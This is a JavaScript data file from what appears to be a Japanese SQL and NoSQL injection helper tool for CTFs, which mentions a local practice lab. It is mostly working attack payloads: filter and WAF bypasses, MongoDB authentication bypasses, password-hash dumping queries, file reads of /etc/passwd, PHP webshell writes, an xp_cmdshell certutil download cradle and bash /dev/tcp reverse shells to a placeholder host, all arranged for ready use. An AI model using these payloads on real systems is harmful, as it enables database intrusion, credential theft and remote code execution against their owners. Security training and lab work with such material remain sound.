  {
    t: "MySQL の || は連結ではない (罠)",
    k: "|| pipes concat 連結 oracle postgres mysql",
    d: "MySQL は PIPES_AS_CONCAT 未設定だと <code>||</code> は <b>OR</b>。PG/SQLite/Oracle では連結。and/or フィルタ回避で <code>||</code> を撃つ時に MySQL では意味が変わる (OR なので実は同じ挙動になることも多いが、連結のつもりで撃つと事故る)。",
    p: []
  },
  {
    t: "DBMS別 N行目の取り方",
    k: "limit top rownum offset 複数行 行",
    d: "<ul><li>MySQL/PG/SQLite: <code>LIMIT 1 OFFSET n</code></li><li>MSSQL: <code>SELECT TOP 1 ... WHERE id NOT IN (...) </code> か ROW_NUMBER</li><li>Oracle: <code>WHERE ROWNUM=1</code> / 12c+ <code>OFFSET n ROWS FETCH NEXT 1 ROWS ONLY</code></li></ul>"
  },
  {
    t: "MySQL DIOS (Dump In One Shot)",
    k: "dios 一撃 dump 全部",
    d: "1リクエストでスキーマ全部を1セルに流し込む大技。@変数を再帰的に連結させる。長い出力が1カラムに表示される場面で使う。",
    p: ["(select(@) from (select(@:=0x00),(select(@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#"]
  },
  {
    t: "文字コード系の小技",
    k: "charset utf8 文字コード 大文字 小文字 collation 照応",
    d: "<ul><li>hex比較はバイナリ一致 → 大文字小文字を区別したい時は HEX() で比較</li><li>SQLite の LIKE は ASCII 範囲は大文字小文字を区別しない (差分に注意)</li><li>UTF-8 のマルチバイトは1バイトずつ ASCII() で抜く (32-255 の範囲で二分探索)</li></ul>"
  },
  {
    t: "sqlmap 早見 + tamper 対応表",
    k: "sqlmap tamper 自動 ツール",
    d: "<code>sqlmap -u \"URL?p=1*\" --dbs --batch --tamper=A,B</code> (<code>*</code>で注入位置を明示)",
    p: [
      "スペース除去 → --tamper=space2comment / space2plus / space2randomblank",
      "= 禁止 → --tamper=equaltolike / between (GREATEST化)",
      "大小文字blacklist → --tamper=randomcase / charencode",
      "引用符エスケープ → --tamper=apostrophemask (%27化) / charunicodeencode",
      "キーワード削除型 → --tamper=between,randomcase (過剰検知回避)",
      "UNION検知回避 → --tamper=unionalltounionall / 字句系",
      "-r req.txt (Burpリクエスト再利用), --technique=BT (盲注に限定), --level=3 --risk=2 (パラメータ全域)"
    ]
  },
  {
    t: "有名CTFパターン → 突破技 早見表",
    k: "los webhacking kr パターン 有名 定番",
    d: "<table><tr><th>問題の特徴</th><th>突破</th></tr>" +
      "<tr><td>数値型 + or/and 禁止</td><td><code>||</code> / <code>&amp;&amp;</code> に置換</td></tr>" +
      "<tr><td>preg_match('/prob|_|\\.|\\(\\)/i') (LOS umaru型)</td><td>括弧・ドット禁止 → <code>like 'a%'</code> 直接比較のみ。関数は全滅</td></tr>" +
      "<tr><td>addslashes + SET NAMES gbk</td><td>ワイドバイト <code>%df'</code></td></tr>" +
      "<tr><td>ereg() (PHP5.3以前)</td><td>NULLバイト <code>%00</code> で以降を切捨て</td></tr>" +
      "<tr><td>str_replace(' ','') 一括</td><td><code>/**/</code> か <code>%09</code></td></tr>" +
      "<tr><td>str_replace でキーワード削除 (ループなし)</td><td>二重書き <code>selselectect</code></td></tr>" +
      "<tr><td>パスワードを md5 比較</td><td>バイパス不能 → UNION/盲注で hash リーク→クラック</td></tr>" +
      "<tr><td>admin固定 + pwが未知 (ログイン可否のみ)</td><td>boolean blind: <code>and substr(pw,1,1)='a'</code></td></tr>" +
      "<tr><td>応答時間だけが変えられる</td><td>time blind + 自動化スクリプト</td></tr>" +
      "<tr><td>IPで管理者判定</td><td>XFF ヘッダ注入</td></tr>" +
      "<tr><td>ソートリンク (?sort=)</td><td>ORDER BY injection (CASE WHEN)</td></tr>" +
      "<tr><td>検索フォーム (%'</td><td>LIKE文脈: <code>%' AND ... AND '</code> で前後を維持</td></tr>" +
      "<tr><td>Windows + MySQL + FILE権限</td><td>OOB (UNC) / INTO OUTFILE</td></tr>" +
      "<tr><td>MSSQL + スタック可</td><td>xp_cmdshell で RCE</td></tr>" +
      "<tr><td>PG + スーパーユーザ</td><td>COPY TO PROGRAM / pg_read_file</td></tr>" +
      "<tr><td>SQLite</td><td>sqlite_master.sql で全構造 / ATTACH DATABASE でシェル</td></tr>" +
      "<tr><td>登録→プロフィール表示</td><td>二次注入</td></tr></table>"
  },
  {
    t: "検出から攻略までの実践チェックリスト",
    k: "checklist 手順 実践",
    d: "<ul><li>□ パラメータ毎に <code>'</code> を撃ってエラー/差分</li><li>□ Cookie / XFF / UA / Referer も撃つ</li><li>□ POST と JSON ボディも忘れない</li><li>□ 数値文脈なら クォート無しで</li><li>□ ソート/ページング パラメータ (order, page, limit)</li><li>□ フィルタがあるなら ソース解析 → バイパス ラボ</li><li>□ カラム数 → 表示列 → information_schema → flag</li><li>□ flagテーブルが無ければ DB 一覧 (schemata) → 別DB</li><li>□ 詰んだら OOB と二次と、もっと他の注入点</li></ul>"
  }
];

const ANALYZERS = [
  {
    re: /addslashes|magic_quotes/i,
    msg: "addslashes / magic_quotes 系エスケープ",
    sev: "warn",
    chips: ["quote"],
    advice: ["GBK/Big5/SJIS 系文字コード (SET NAMES gbk) ならワイドバイト %df' が刺さる", "数値コンテキスト (id=1) なら引用符不要でそのまま注入", "文字列リテラルは 0xヘックス (0x61646d696e) にして引用符を消す"]
  },
  {
    re: /(mysqli?_real_escape_string|escape_string)\s*\(/i,
    msg: "real_escape_string",
    sev: "bad",
    chips: [],
    advice: ["文字コードが正しければ原理的に突破不能 → 他の注入点 (ヘッダ/別パラメータ/二次) を探す", "ただし mysql_real_escape_string を SET NAMES gbk と併用している実装はワイドバイトで落ちる"]
  },
  {
    re: /SET\s+NAMES\s+(gbk|big5|gb2312|sjis|cp932|euckr|euc-kr)/i,
    msg: "マルチバイト文字コード検出",
    sev: "warn",
    chips: ["quote"],
    advice: ["ワイドバイト: %bf%27 / %df%27 / %a1%27 を先頭に付けて引用符を復活させる"]
  },
  {
    re: /(intval\(|\(int\)\s*\$|is_numeric\(|filter_var\([^,]+,\s*FILTER_VALIDATE_INT|\bctypenum|::number\(|parseInt|Number\()/i,
    msg: "数値キャスト/検証",
    sev: "bad",
    chips: [],
    advice: ["このパラメータは数値化されるので注入不可 → 他のパラメータ・ヘッダ (XFF) 等を探す"]
  },
  {
    re: /(htmlspecialchars|htmlentities)\s*\(/i,
    msg: "HTMLエンティティ化",
    sev: "warn",
    chips: ["quote"],
    advice: ["SQL文脈で使われているなら引用符は &#039; 化され文字列終端できない → 数値インジェクションか hex リテラルで"]
  },
  {
    re: /strtolower\s*\(/i,
    msg: "小文字化",
    sev: "warn",
    chips: [],
    advice: ["大小文字混合 (SeLeCt) による回避は無効。二重書き/コメント分割で"]
  },
  {
    re: /ereg(i)?\s*\(/i,
    msg: "ereg 系 (PHP5.3以前)",
    sev: "warn",
    chips: [],
    advice: ["NULLバイト %00 以降を切り捨てられる可能性: admin%00' 等"]
  },
  {
    re: /blacklist|black_list|deny|blocklist/i,
    msg: "ブラックリスト変数",
    sev: "warn",
    chips: [],
    advice: ["中身 (キーワード配列) を読んでチップを手動設定せよ"]
  }
];

const PREG_MAP = [
  { kw: "select", chips: ["select"], note: "SELECT拒否 → 二重書き/コメント分割/盲注" },
  { kw: "union", chips: ["union"], note: "UNION拒否 → 二重書き/コメント分割。無理なら盲注・エラー系" },
  { kw: "and", chips: ["andor"], note: "AND拒否 → &&" },
  { kw: "or", chips: ["andor"], note: "OR拒否 → ||。注意: /or/i は information, order, for も部分一致で殺す" },
  { kw: "sleep", chips: ["sleep"], note: "SLEEP拒否 → benchmark / 重いクエリ" },
  { kw: "substr", chips: ["substr"], note: "substr拒否 → mid/left/like/rlike" },
  { kw: "substring", chips: ["substr"], note: "" },
  { kw: "mid", chips: ["substr"], note: "" },
  { kw: "ascii", chips: ["ascii"], note: "ascii拒否 → ord / hex / 直接文字比較" },
  { kw: "ord", chips: ["ascii"], note: "" },
  { kw: "information", chips: ["infoschema"], note: "info_schema拒否 → mysql.innodb_table_stats / sys" },
  { kw: "if", chips: ["if"], note: "IF拒否 → CASE WHEN" },
  { kw: "space|\\s", chips: ["space"], note: "空白拒否 → /**/ / %09 / %0a" },
  { kw: ",", chips: ["comma"], note: "カンマ拒否 → FROM-FOR構文 / OFFSET" },
  { kw: "=", chips: ["eq"], note: "=拒否 → LIKE / RLIKE / BETWEEN" },
  { kw: "\\(", chips: ["paren"], note: "括弧拒否 → 関数呼び出し不能。直接比較のみ" },
  { kw: "'", chips: ["quote"], note: "引用符拒否 → 0x hex / char()" },
  { kw: "--|#|/\\*", chips: ["comment", "inline"], note: "コメント拒否 → 引用符で自分で閉じる" },
  { kw: "[0-9]|\\\\d", chips: ["number"], note: "数字拒否 → true演算 (MySQL)" }
];

const NOSQL = {
  detect: [
    { t: "演算子汚染テスト (フォーム)", p: "username[$ne]=x&password[$ne]=x", n: "PHPの $_GET パースが配列化する実装なら $ne 演算子が受理される。ログインが通ればNoSQL確定。" },
    { t: "演算子汚染テスト (JSON)", p: '{"username": {"$ne": null}, "password": {"$ne": null}}', n: "JSONボディ版。Content-Type: application/json で送る。" },
    { t: "文字列コンテキスト", p: "admin' || '1'=='1", n: "古い実装 (文字列連結でクエリ組立) の定番。" },
    { t: "$where 注入", p: "username=admin&password[$where]=this.password.length>5", n: "$where は JavaScript が書ける。真偽で応答が変われば $where 盲注も可能。" },
    { t: "エラーキーワード", p: "' \" ; { } $ ", n: "レスポンス/ログに MongoError, BSONError, SyntaxError, ReferenceError 等が出るか。" },
    { t: "型エラー差分", p: '{"username": {"$gt": []}, "password": {"$gt": []}}', n: "型不一致エラーの有無を真偽オラクルにする手法 (error-based NoSQL)。" }
  ],
  auth: [
    { t: "$ne バイパス (URLエンコード形式)", p: "username[$ne]=toto&password[$ne]=toto" },
    { t: "$ne バイパス (JSON)", p: '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}' },
    { t: "$gt バイパス", p: "login[$gt]=admin&login[$lt]=test&pass[$ne]=1", n: "範囲指定でadminを挟む。" },
    { t: "$nin バイパス", p: "login[$nin][]=guest&login[$nin][]=test&pass[$ne]=1" },
    { t: "$regex バイパス", p: "login[$regex]=a.*&pass[$ne]=lol" },
    { t: "$in でユーザー列挙", p: '{"username":{"$in":["Admin","4dm1n","admin","root","administrator"]},"password":{"$gt":""}}', n: "大文字/leetバリエーションを一括試す。" },
    { t: "重複キー (最後勝ち)", p: '{"id":"10", "id":"100"}', n: "MongoDBは重複キーで最後のみ有効。WAFが先頭のみ検査する場合の回避。" }
  ],
  blind: [
    { t: "長さ特定", p: "username=admin&password[$regex]=^.{8}$", n: "^.{N}$ の N を変える。応答が真になる長さが答え。" },
    { t: "1文字特定", p: "username=admin&password[$regex]=^a", n: "^已知 + 候補文字 の先頭一致で1文字ずつ。" },
    { t: "1文字特定 (JSON)", p: '{"username": {"$eq": "admin"}, "password": {"$regex": "^a"}}' },
    { t: "$where 盲注", p: "username[$where]=this.username=='admin'&&this.password.charCodeAt(0)==97", n: "$where でJS比較。真偽差分で1ビットずつ。" },
    { t: "$where 遅延 (古いMongoDB)", p: "username[$where]=this.username=='admin'&&this.password[0]=='a'&&sleep(5000)", n: "sleep() は新しいMongoDBでは削除済み → 大量ループで重くする: while(true){}" }
  ]
};

const CTXS = {
  orderby: [
    { t: "盲注 (並び順がオラクル)", p: "?order=(CASE WHEN (SUBSTR((SELECT pw FROM users WHERE id='admin'),1,1)='a') THEN id ELSE title END)" , n: "UNION不可。1列目のソート結果の変化で真偽判定。MySQL は if(...) でも可。"},
    { t: "エコー試行", p: "?order=(SELECT version())", n: "SELECTリスト相当の式が置けるDBMSでは値が出ることがある。"},
    { t: "エラー ベース併用", p: "?order=(SELECT EXTRACTVALUE(1,CONCAT(0x7e,version())))", n: "ORDER BY 内でもサブクエリ関数は動く → エラーベースが最短 (MySQL)。"}
  ],
  limit: [
    { t: "PROCEDURE ANALYSE (MySQL <=5.5)", p: "1 LIMIT 1,1 PROCEDURE ANALYSE()", n: "LIMIT後に入る構文。1列エコーを奪える古い大技。5.7以降は削除済み。"},
    { t: "LIMIT 内 UNION", p: "1 LIMIT 0,1 UNION SELECT 1,version(),3", n: "LIMIT の後にも UNION を足せる (MySQL)。"}
  ],
  insert: [
    { t: "VALUES 内注入 (閉じて式)", p: "a@b.com', (SELECT version()), 'x", n: "INSERT INTO t (email, x, y) VALUES ('{in}', ...) 型。"},
    { t: "連結演算子版 (PG/SQLite/Oracle)", p: "a' || (SELECT version()) || '" },
    { t: "hex版 (クォート禁止)", p: "a@b.com', (SELECT version()), 0x78" },
    { t: "副問合せで行挿入 (MySQL)", p: "x', 'y') ON DUPLICATE KEY UPDATE pw='newpass'-- -", n: "重複キー更新を悪用して管理者pwを書き換える古典。" }
  ],
  update: [
    { t: "SET 内注入", p: "', pw=(SELECT version())-- -", n: "UPDATE t SET col='{in}' WHERE ... 型。"},
    { t: "SET 内 (複数列)", p: "', pw=(SELECT pw FROM users WHERE id='admin') WHERE id='me'-- -", n: "他ユーザーの値を自分の行にコピーして眺める。" }
  ],
  like: [
    { t: "検索文脈 バランス", p: "%' AND 1=1 AND '%'='", n: "WHERE x LIKE '%{in}%' 型。前後の '% を再利用して閉じる。"},
    { t: "検索文脈 UNION", p: "%' UNION SELECT 1,version(),3-- -", n: "末尾はコメントで捨てる。"},
    { t: "1文字ワイルド", p: "_", n: "LIKE文脈では _ が任意1文字。長さ特定に使える。" }
  ]
};

const RCE_TPL = {
  mysql: [
    { t: "ウェブシェル (INTO OUTFILE)", p: "1' UNION SELECT NULL,'<?php system($_GET[c]);?>',NULL INTO OUTFILE '{PATH}/s.php'-- -", n: "条件: FILE権限 + secure_file_priv空 + 書込可能パス。" },
    { t: "ウェブシェル (FIELDS迂回)", p: "1' UNION SELECT 1,2 INTO OUTFILE '{PATH}/s.php' FIELDS TERMINATED BY '<?php system($_GET[c]);?>'-- -", n: "クォート/型エラーをFIELDS構文で回避する版。" },
    { t: "OOB DNS (Windows限定)", p: "1' AND LOAD_FILE(CONCAT('\\\\\\\\',HEX(database()),'.{DOMAIN}\\a'))-- -", n: "secure_file_priv空 + Windows + UNC名解決が必要。dnslogで受信。" },
    { t: "UDF RCE (root)", p: "1' UNION SELECT NULL,LOAD_FILE('/tmp/udf.so') INTO DUMPFILE '/usr/lib/plugin/udf.so'-- -", n: "lib_mysqludf_sys を流し込めば sys_eval() でコマンド実行。準備が重い。" }
  ],
  mssql: [
    { t: "xp_cmdshell 有効化 (スタック)", p: "1';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -", n: "MSSQL 2005+ は既定無効 → まず有効化。" },
    { t: "コマンド実行", p: "1';EXEC master..xp_cmdshell 'whoami'-- -", n: "出力は返らない (blind) → リバース系と併用。" },
    { t: "リバース (ダウンロードクレードル)", p: "1';EXEC xp_cmdshell 'certutil -urlcache -f http://{HOST}:{PORT}/s.exe C:\\\\s.exe && C:\\\\\\\\s.exe'-- -", n: "自前で s.exe (reverse shell) をホストしておく。" },
    { t: "SMB/NTLM 取得", p: "1';EXEC master..xp_dirtree '\\\\{HOST}\\a'-- -", n: "responder/ntlmcatch でハッシュ取得。" },
    { t: "OOB DNS", p: "1';DECLARE @q varchar(999);SET @q=DB_NAME();EXEC('master..xp_dirtree \"\\\\'+@q+'.{DOMAIN}\\a\"')-- -" }
  ],
  postgres: [
    { t: "リバースシェル (COPY TO PROGRAM)", p: "1';COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1\"'-- -", n: "スーパーユーザ/pg_execute_server_program 権限が必要。" },
    { t: "ファイル読み取り", p: "1';SELECT pg_read_file('/etc/passwd',0,200)-- -", n: "新しいPGは絶対パス可 (superuser)。" },
    { t: "ディレクトリ一覧", p: "1';SELECT pg_ls_dir('/')-- -" },
    { t: "OOB (dblink)", p: "1';SELECT * FROM dblink('host={DOMAIN} user=x','SELECT 1') AS t(x int)-- -", n: "CREATE EXTENSION dblink が済んでいる場合。" }
  ],
  sqlite: [
    { t: "ウェブシェル (ATTACH DATABASE)", p: "1';ATTACH DATABASE '{PATH}/s.php' AS x;CREATE TABLE x.t(d);INSERT INTO x.t VALUES ('<?php system($_GET[c]);?>');-- -", n: "PHPは先頭ゴミを許容するのでSQLiteヘッダが混ざっても動く。スタック必須 (PDO等)。" },
    { t: "cron (root時)", p: "1';ATTACH DATABASE '/etc/cron.d/pwn' AS c;CREATE TABLE c.t(d);INSERT INTO c.t VALUES (char(10)||'* * * * * root bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1'||char(10));-- -" },
    { t: "load_extension", p: "1';SELECT load_extension('\\\\\\\\{HOST}\\\\share\\\\evil.dll','DllMain');-- -", n: "ビルド/設定で有効時のみ。" }
  ],
  oracle: [
    { t: "OOB DNS", p: "1' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{DOMAIN}') FROM dual) IS NOT NULL-- -" },
    { t: "XXE 経由 OOB", p: "1' AND (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % r SYSTEM \"http://{HOST}:{PORT}/x\">%r;]>'),'/l') FROM dual) IS NOT NULL-- -", n: "古い未パッチOracleで可。" }
  ]
};

const SQLMAP_TAMPERS = [
  { ids: ["space"], tampers: ["space2comment", "space2plus", "space2randomblank"], note: "スペース除去" },
  { ids: ["eq"], tampers: ["equaltolike", "between"], note: "= 禁止" },
  { ids: ["select", "union"], tampers: ["between", "randomcase"], note: "キーワード拒否 (between は比較式置換で検出難化)" },
  { ids: ["quote"], tampers: ["apostrophemask", "charunicodeencode"], note: "引用符エスケープ" },
  { ids: ["andor"], tampers: ["logical", "randomcase"], note: "and/or 拒否" },
  { ids: ["comma"], tampers: [], note: "カンマ禁止の直接tamperは無し → 生成ペイロード (FROM-FOR等) を --prefix/--suffix や手動で" },
  { ids: ["sleep"], tampers: [], note: "SLEEP禁止 → --time-sec調整か benchmark 系を手動" },
  { ids: ["infoschema"], tampers: [], note: "情報スキーマ拒否 → innodb_table_stats は手動列挙" }
];

CHEATS.push(
  {
    t: "NoSQL (MongoDB) インジェクション入門",
    k: "nosql mongo mongodb $ne $regex $where json",
    d: "<ul><li><code>$_GET/$_POST</code> をそのままクエリに渡す実装が標的。PHPは <code>username[$ne]=x</code> 形式で配列→演算子になる</li><li>認証バイパス: <code>{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}</code></li><li>盲注: <code>password[$regex]=^a</code> で1文字ずつ (長さは <code>^.{8}$</code>)</li><li><code>$where</code> はJavaScript: <code>this.password[0]=='a'</code></li><li>エラー差分 (型不一致) もオラクルになる</li><li>NoSQL タブに専用の生成器とスクリプトがある</li></ul>"
  },
  {
    t: "HTTPパラメータ汚染 (HPP)",
    k: "hpp parameter pollution パラメータ汚染 重複",
    d: "同名パラメータを複数送ると実装言語によって解釈が割れる (PHP=最後, ASP/JSP=連結/最初, Apache=最初)。<code>?id=1&id=UNION SELECT...</code> のように、WAFは片方だけ見てアプリはもう片方を使う状況を作る。",
    p: ["?id=1&id=-1' UNION SELECT 1,version(),3-- -", "?search=x&search='"]
  },
  {
    t: "JSON / XML ボディの注入点",
    k: "json xml body ボディ graphql",
    d: "<ul><li>JSON: <code>{\"id\": \"1'\"}</code> — 数値に見せて <code>{\"id\": 1e0}</code> 科学的表記でWAF迂回も</li><li>XML: <code>&lt;id&gt;1'&lt;/id&gt;</code> — エンティティ <code>&amp;apos;</code> も復号後に刺さる場合あり</li><li>GraphQL: argument に文字列注入 + introspection でスキーマ丸見え</li><li>Content-Type を変える (form↔JSON) だけで検証ロジックを迂回できることも</li></ul>",
    p: ["{\"id\": \"1' UNION SELECT 1,version(),3-- -\"}", "{\"id\": {\"$ne\": null}}"]
  },
  {
    t: "エンコードの梯子 (多重デコード)",
    k: "encode url 二重 多重 デコード ladder",
    d: "サーバ/WAFが複数回デコードする場合、一段深くエンコードするだけで抜ける。<code>'</code> → <code>%27</code> → <code>%2527</code> → <code>%25252 7</code>。キーワードも <code>SELECT</code> → <code>%53ELECT</code>。ツールタブのエンコーダで一括生成。",
    p: ["1%2527 AND 1=1-- -", "%53ELECT"]
  },
  {
    t: "ローカル演習ラボ (同梱)",
    k: "lab 演習 練習 ローカル テスト",
    d: "このリポジトリの <code>lab/</code> に演習環境を同梱した。<code>cd lab && docker compose up -d</code> で <code>http://127.0.0.1:8081</code> に5ステージ (基本UNION / スペース除去 / GBKワイドバイト / ブール盲注 / 時間盲注) が立つ。ツールで生成したペイロードの実効確認に使える。127.0.0.1限定バインド。"
  }
);

FILTERS.push(
  { id: "upper", label: "大文字 [A-Z]", desc: "大文字が拒否/ブラックリスト一致(strtoupper検査含む) → 全トークン小文字化で回避" },
  { id: "lower", label: "小文字 [a-z]", desc: "小文字が拒否/小文字で大文字小文字区別一致 → 引用符外を大文字化で回避" }
);

PRESETS.push(
  { label: "大文字のみ禁止 → 全小文字化", ids: ["upper"] },
  { label: "小文字のみ禁止 → 大文字化", ids: ["lower"] },
  { label: "大文字小文字両方禁止 (絶望)", ids: ["upper", "lower"] }
);

PREG_MAP.push(
  { kw: "A-Z", chips: ["upper"], note: "大文字拒否 → 全小文字化 (SQLは大文字小文字不区別)" },
  { kw: "a-z", chips: ["lower"], note: "小文字拒否 → キーワード大文字化 (引用符内は保持)" },
  { kw: "A-Za-z", chips: [], note: "全アルファベット拒否 → キーワードが書けない。16進リテラル/コメント分割/URLエンコード (%75nion) で" },
  { kw: "a-zA-Z", chips: [], note: "全アルファベット拒否 → 同上" }
);

ANALYZERS.push(
  {
    re: /strtoupper\s*\(/i,
    msg: "strtoupper で大文字化してからブラックリスト検査",
    sev: "warn",
    chips: ["upper"],
    advice: ["大文字化した状態で一致を見る → ペイロードを全部小文字で書けば検出を回避できる (大文字拒否と同型)"]
  }
);

CHEATS.push(
  {
    t: "大文字小文字フィルタの全系譜",
    k: "case 大文字 小文字 strtoupper strtolower randomcase 区別",
    d: "<ul><li><b>大文字だけ拒否</b> ([A-Z] / strtoupper検査): 全トークンを<b>小文字</b>で書く。SQLは大文字小文字不区別なのでそのまま動く</li><li><b>小文字だけ拒否</b> ([a-z] / 小文字で区別一致): キーワードを<b>大文字</b>化。ただし文字列リテラルの中身は値が変わるので保持すること (バイパス ラボの変換は引用符内を保持する)</li><li><b>strtolower してから一致</b> (/i 付きと同義): 大小文字トリックは全滅 → コメント分割 (un/**/ion) や二重書きへ</li><li><b>hexリテラル注意</b>: MySQLは 0x の x は小文字必須 (0X61 は不可)。バイパス変換は 0x 接頭辞を保護する</li><li><b>識別子の事情</b>: Oracle のディクショナリは大文字統一、PostgreSQL の未クォート識別子は小文字統一、MySQL/Linux のテーブル名は区別あり</li><li><b>SQLite</b>: LIKE は ASCII 範囲で大文字小文字を区別しない (= は区別する)</li></ul>"
  }
);

const XENUM = {
  mysql: [
    { t: "DB一覧 (schemata)", x: "group_concat(schema_name) FROM information_schema.schemata" },
    { t: "全DB横断テーブル検索", x: "group_concat(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_name LIKE '%{K}%'", n: "table_schema も一緒に取るのがコツ。他DBなら db.table で直接アクセス可。" },
    { t: "全テーブル横断カラム検索", x: "group_concat(table_name,0x2e,column_name) FROM information_schema.columns WHERE column_name LIKE '%{K}%'", n: "'pass' 'flag' 'secret' 等で総当たり。" },
    { t: "パスワードハッシュ (mysql.user)", x: "group_concat(user,0x3a,authentication_string,0x20,host) FROM mysql.user", n: "要 root 権限。5.7+/8 は caching_sha2 (hashcat -m 3200)、4.1-5.6 は SHA1二重 (-m 300)。", hard: true },
    { t: "権限チェック (FILE権限)", x: "concat(@@secure_file_priv,'|',@@have_ssl)", n: "secure_file_priv が空なら LOAD_FILE/OUTFILE が自由。" },
    { t: "root判定", x: "(SELECT COUNT(*) FROM mysql.user WHERE user=0x726f6f74 AND super_priv=0x59)", n: "1 なら接続ユーザー行情報が見える権限あり。" }
  ],
  postgres: [
    { t: "DB一覧", x: "string_agg(datname,',') FROM pg_database" },
    { t: "全スキーマ横断テーブル検索", x: "string_agg(table_schema||'.'||table_name,',') FROM information_schema.tables WHERE table_name LIKE '%{K}%'" },
    { t: "全カラム検索", x: "string_agg(table_name||'.'||column_name,',') FROM information_schema.columns WHERE column_name LIKE '%{K}%'" },
    { t: "パスワードハッシュ (pg_shadow)", x: "string_agg(usename||':'||passwd,',') FROM pg_shadow", n: "スーパーユーザのみ可。MD5(password+username) 形式。", hard: true },
    { t: "スーパーユーザ判定", x: "current_setting('is_superuser')" }
  ],
  sqlite: [
    { t: "テーブル検索", x: "group_concat(name) FROM sqlite_master WHERE name LIKE '%{K}%'" },
    { t: "カラム検索 (CREATE文から)", x: "group_concat(sql) FROM sqlite_master WHERE sql LIKE '%{K}%'", n: "sqlite_master.sql に定義全文が入っている。" },
    { t: "ユーザー/ハッシュ", x: "(無し)", n: "SQLite にユーザー概念は無い。", hard: false }
  ],
  mssql: [
    { t: "DB一覧", x: "string_agg(name,',') FROM master..sysdatabases" },
    { t: "全DB横断テーブル検索", x: "string_agg(table_catalog+'.'+table_name,',') FROM information_schema.tables WHERE table_name LIKE '%{K}%'" },
    { t: "全カラム検索", x: "string_agg(table_name+'.'+column_name,',') FROM information_schema.columns WHERE column_name LIKE '%{K}%'" },
    { t: "パスワードハッシュ (sql_logins)", x: "(SELECT name+'-'+master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins)", n: "2005+。hashcat -m 131/132。要権限。", hard: true },
    { t: "sysadmin判定", x: "(SELECT is_srvrolemember('sysadmin'))", n: "1 なら sysadmin → xp_cmdshell の道。" }
  ],
  oracle: [
    { t: "ユーザー一覧", x: "(SELECT listagg(username,',') WITHIN GROUP (ORDER BY 1) FROM all_users)" },
    { t: "全テーブル検索", x: "(SELECT listagg(owner||'.'||table_name,',') WITHIN GROUP (ORDER BY 1) FROM all_tables WHERE table_name LIKE '%{K}%')", n: "Oracle のディクショナリは大文字なので {K} は大文字で。" },
    { t: "全カラム検索", x: "(SELECT listagg(table_name||'.'||column_name,',') WITHIN GROUP (ORDER BY 1) FROM all_tab_columns WHERE column_name LIKE '%{K}%')" },
    { t: "パスワードハッシュ (user$)", x: "(SELECT name||':'||password FROM sys.user$ WHERE password IS NOT NULL)", n: "DBA権限 + 11g以前はDES(hashcat -m 3100)、11g+はSHA2で非抽出。", hard: true }
  ]
};

const FILEREAD = {
  mysql: [
    { t: "LOAD_FILE", x: "(SELECT LOAD_FILE('/etc/passwd'))", n: "FILE権限 + secure_file_priv が対象dirを含む必要。戻りが NULL なら条件不足。" },
    { t: "LOAD_FILE + base64 (文字化け回避)", x: "(SELECT TO_BASE64(LOAD_FILE('/var/www/html/index.php')))", n: "ソース読みに。base64でデコード。" },
    { t: "secure_file_priv 確認", x: "@@secure_file_priv", n: "空文字 '' なら全域、パスならその配下のみ、NULL なら読み書き不可。" }
  ],
  postgres: [
    { t: "pg_read_file", x: "pg_read_file('/etc/passwd',0,200)", n: "スーパーユーザ or pg_read_server_files。" },
    { t: "ディレクトリ一覧", x: "pg_ls_dir('/')", n: "まず何があるか確認。" }
  ],
  sqlite: [
    { t: "ファイル読み取り", x: "(標準では不可)", n: "SQLite はファイルI/O無し (writefile のみ拡張)。ATTACH で他dbファイルを覗く手はある。", hard: false }
  ],
  mssql: [
    { t: "OPENROWSET(BULK)", x: "(SELECT x FROm OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x))", n: "ADMINISTER BULK OPERATIONS 権限。" },
    { t: "xp_cmdshell type", x: "1';EXEC xp_cmdshell 'type C:\\inetpub\\wwwroot\\web.config'-- -", n: "出力は返らないので OOB/時間差分と併用 (スタック時)。" }
  ],
  oracle: [
    { t: "UTL_FILE", x: "(無し: 権限要)", n: "UTL_FILE.FGETS はストアド経由のみ → スタック+PL/SQL が必要で実戦は OOB 主体。", hard: false }
  ]
};

const FILTER_PROBES = [
  { label: "引用符 '", p: "'", chip: "quote" },
  { label: "スペース", p: "1 1", chip: "space" },
  { label: "コメント --", p: "1-- -", chip: "dash" },
  { label: "コメント #", p: "1#", chip: "hash" },
  { label: "ブロックコメント /*", p: "1/*", chip: "inline" },
  { label: "カンマ ,", p: "1,1", chip: "comma" },
  { label: "括弧 ( )", p: "(1)", chip: "paren" },
  { label: "等号 =", p: "1=1", chip: "eq" },
  { label: "and", p: "1 and 1", chip: "andor" },
  { label: "or", p: "1 or 1", chip: "andor" },
  { label: "union", p: "union", chip: "union" },
  { label: "select", p: "select", chip: "select" },
  { label: "sleep", p: "sleep(1)", chip: "sleep" },
  { label: "substr", p: "substr(1,1,1)", chip: "substr" },
  { label: "ascii", p: "ascii(1)", chip: "ascii" },
  { label: "if(", p: "if(1,1,1)", chip: "if" },
  { label: "数字", p: "2", chip: "number" },
  { label: "information_schema", p: "information_schema", chip: "infoschema" },
  { label: "大文字のみ UNION", p: "UNION SELECT", chip: "upper" },
  { label: "小文字のみ union", p: "union select", chip: "lower" }
];

CHEATS.push(
  {
    t: "sqlmap / bbqsql 機能対応表",
    k: "sqlmap bbqsql 機能 比較 対応 search users passwords file-read second-url",
    d: "<table><tr><th>機能</th><th>sqlmap等</th><th>当ツール</th></tr>"
      +"<tr><td>5技法 (Boolean/Time/Error/UNION/Stacked)</td><td>○</td><td>○ 各タブ + RCEタブ</td></tr>"
      +"<tr><td>DB一覧・全DB横断テーブル/カラム検索 (--search)</td><td>○</td><td>○ UNION⑨ 横断列挙</td></tr>"
